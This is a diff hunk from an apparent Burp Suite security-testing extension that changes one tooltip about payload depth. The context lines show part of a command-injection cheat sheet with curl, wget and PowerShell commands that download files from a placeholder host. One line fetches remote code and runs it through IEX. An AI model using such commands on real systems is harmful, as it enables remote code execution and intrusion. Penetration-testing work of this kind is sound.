@@ -936,7 +936,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
         self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
-        _lblDepth.setToolTipText("Generate payloads only for some certain folder depth.")
+        _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
         _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
         _btnGenerateDict.setToolTipText("Click to generate payloads.")
         self._lblStatusLabel = JLabel()
